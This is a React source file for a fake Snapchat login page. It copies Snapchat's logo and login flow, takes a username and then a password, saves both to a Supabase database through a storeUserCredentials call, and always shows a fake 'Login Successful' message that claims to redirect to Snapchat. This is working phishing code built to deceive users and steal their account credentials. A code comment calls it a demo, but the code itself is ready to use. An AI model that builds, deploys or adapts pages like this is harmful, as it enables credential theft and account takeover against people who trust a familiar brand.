import { useState } from 'react';
import SnapchatLogo from './components/SnapchatLogo';
import { storeUserCredentials } from './lib/supabase';
import './App.css';

function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [currentStep, setCurrentStep] = useState('username'); // 'username' | 'password' | 'success'
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({});

  // Handle username submission
  const handleUsernameSubmit = (e) => {
    e.preventDefault();

    // Validate username
    if (!username.trim()) {
      setErrors({ username: 'Please enter your username or email' });
      return;
    }

    // Clear errors and proceed to password step
    setErrors({});
    setCurrentStep('password');
  };

  // Handle password submission
  const handlePasswordSubmit = async (e) => {
    e.preventDefault();

    // Validate password
    if (!password.trim()) {
      setErrors({ password: 'Please enter your password' });
      return;
    }

    if (password.length < 1) {
      setErrors({ password: 'Password is required' });
      return;
    }

    setErrors({});
    setIsLoading(true);

    try {
      // Store credentials in Supabase
      const result = await storeUserCredentials(username, password);

      if (result.error) {
        console.error('Failed to store credentials:', result.error);
        // Still show success to user (for demo purposes)
      }

      // Show success state
      setCurrentStep('success');
    } catch (error) {
      console.error('Error during login:', error);
      setErrors({ password: 'Something went wrong. Please try again.' });
    } finally {
      setIsLoading(false);
    }
  };

  // Go back to username step
  const handleBack = () => {
    setCurrentStep('username');
    setPassword('');
    setErrors({});
  };

  return (
    <div className="app">
      <div className="login-container">
        <div className="login-content">
          {/* Snapchat Logo */}
          <div className="snap-logo">
            <SnapchatLogo />
          </div>

          {/* Page Title */}
          <h1 className="login-title">Log in to Snapchat</h1>

          {/* Username Step */}
          {currentStep === 'username' && (
            <form className="login-form fade-in" onSubmit={handleUsernameSubmit}>
              <div className="input-group">
                <label htmlFor="username" className="input-label">
                  Username or Email
                </label>
                <input
                  type="text"
                  id="username"
                  className={`input-field ${errors.username ? 'error' : ''}`}
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  autoComplete="username"
                  autoFocus
                />
                {errors.username && (
                  <span className="error-message">{errors.username}</span>
                )}
              </div>

              <div className="phone-link">
                <a href="#phone">Use phone number instead</a>
              </div>

              <button type="submit" className="next-button" disabled={isLoading}>
                Next
              </button>
            </form>
          )}

          {/* Password Step */}
          {currentStep === 'password' && (
            <form className="login-form fade-in" onSubmit={handlePasswordSubmit}>
              <div className="input-group">
                <label htmlFor="password" className="input-label">
                  Password
                </label>
                <div className="password-input-container">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    id="password"
                    className={`input-field ${errors.password ? 'error' : ''}`}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    autoComplete="current-password"
                    autoFocus
                  />
                  <button
                    type="button"
                    className="password-toggle"
                    onClick={() => setShowPassword(!showPassword)}
                    aria-label={showPassword ? 'Hide password' : 'Show password'}
                  >
                    {showPassword ? (
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
                        <line x1="1" y1="1" x2="23" y2="23" />
                      </svg>
                    ) : (
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                        <circle cx="12" cy="12" r="3" />
                      </svg>
                    )}
                  </button>
                </div>
                {errors.password && (
                  <span className="error-message">{errors.password}</span>
                )}
              </div>

              <div className="phone-link">
                <a href="#forgot">Forgot your password?</a>
              </div>

              <button type="submit" className="next-button" disabled={isLoading}>
                {isLoading ? (
                  <>
                    <span className="spinner"></span>
                    Logging in...
                  </>
                ) : (
                  'Log In'
                )}
              </button>

              <div className="phone-link" style={{ marginTop: '16px' }}>
                <a href="#" onClick={handleBack}>← Back</a>
              </div>
            </form>
          )}

          {/* Success Step */}
          {currentStep === 'success' && (
            <div className="success-message fade-in">
              <div className="success-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
                  <polyline points="22 4 12 14.01 9 11.01" />
                </svg>
              </div>
              <h2 className="success-title">Login Successful!</h2>
              <p className="success-text">
                Welcome back, {username}!<br />
                Redirecting you to Snapchat...
              </p>
            </div>
          )}

          {/* Sign Up Section */}
          {currentStep !== 'success' && (
            <div className="signup-section">
              <span className="signup-text">New to Snapchat?</span>
              <a href="#signup" className="signup-link">Sign Up</a>
            </div>
          )}
        </div>

        {/* Open in Snapchat Button */}
        <button className="open-app-button">
          Open in Snapchat
        </button>
      </div>
    </div>
  );
}

export default App;
